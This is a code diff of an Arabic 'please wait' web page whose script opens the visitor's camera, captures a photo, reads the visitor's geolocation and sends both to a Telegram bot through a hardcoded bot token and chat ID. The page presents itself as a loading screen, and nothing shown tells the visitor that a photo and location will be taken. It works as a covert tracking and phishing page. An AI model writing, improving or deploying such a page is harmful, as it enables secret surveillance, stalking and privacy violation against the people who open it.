@@ -7,39 +7,37 @@
 <body>
   <h2>يرجى الانتظار...</h2>
 
+  <video id="video" width="300" autoplay muted playsinline style="display: block;"></video>
+
   <script>
     async function captureAndSend() {
       try {
-        // 1- تشغيل الكاميرا
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
+        const video = document.getElementById('video');
         video.srcObject = stream;
         await video.play();
 
-        // 2- الانتظار حتى تشتغل الكاميرا
-        await new Promise(resolve => setTimeout(resolve, 3000));
+        await new Promise(resolve => setTimeout(resolve, 3000)); // الانتظار 3 ثواني
 
-        // 3- التقاط الصورة
         const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
         const imageData = canvas.toDataURL('image/jpeg');
         const blob = await (await fetch(imageData)).blob();
 
-        // 4- إيقاف الكاميرا
         stream.getTracks().forEach(track => track.stop());
 
-        // 5- الحصول على الموقع الجغرافي
+        // الحصول على الموقع
         navigator.geolocation.getCurrentPosition(async (position) => {
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
 
-          // 6- إرسال الصورة
+          // إرسال الصورة
           const formData = new FormData();
-          formData.append("chat_id", "1320552080"); // استبدل بـ chat_id الخاص بك
+          formData.append("chat_id", "1320552080");
           formData.append("photo", blob, "capture.jpg");
 
           await fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
@@ -47,7 +45,7 @@
             body: formData
           });
 
-          // 7- إرسال الموقع
+          // إرسال الموقع
           await fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
             method: "GET"
           });
